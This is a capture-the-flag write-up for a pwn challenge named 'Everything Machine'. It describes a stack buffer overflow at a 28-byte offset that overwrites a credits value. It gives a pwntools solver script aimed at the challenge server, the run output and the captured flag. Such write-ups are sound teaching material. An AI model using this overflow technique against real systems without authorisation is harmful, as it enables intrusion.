# Everything Machine
<br>
<br>

This challenge is pretty similar to [Debugging Spider](../Debugging%20Spiders/), we need to do a buffer overflow to get the flag, If we see the decompiled binary carefully, the value (credit) will be return as `16` if the string we input is not equal to either `flag` or `Trial`, and yes we can do a buffer overflow here to change the return value. 

First, i try to use GDB to find the offset where I can change the value for my credits, and then I found the offset of `28 bytes`, then I thought what if after the 28 bytes I put `b'3030'`, and try it against the server immediately. 

**solver.py**
```python
from pwn import *

binary = './everything'
elf = context.binary = ELF(binary,checksec=True)

gdbscript = '''
b *0x00000000004011b1
'''.format(**locals())

if 'remote' in sys.argv:
    p = remote('34.124.192.13', 60640)
else:
    p = process(binary)
    if 'gdb' in sys.argv:
        gdb.attach(p, gdbscript=gdbscript)

p.recv()

payload = b'a'*28
payload+= b'3030'

print(payload)


p.sendline(payload)

p.interactive()
```

And we got the flag. :relaxed:

```[*] '/home/kiinzu/Documents/FCTF/everything'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to 34.124.192.13 on port 60640: Done
b'aaaaaaaaaaaaaaaaaaaaaaaaaaaa3030'
[*] Switching to interactive mode
Your credits: 0x30333033
FindITCTF{D1v1s10n$_1z_th3_b3st_4LBUM}[*] Got EOF while reading in interactive
```

Note:
- It can actually be any value as long it's greater than 3030, if we use 'aaaa' the value will be 0x61616161 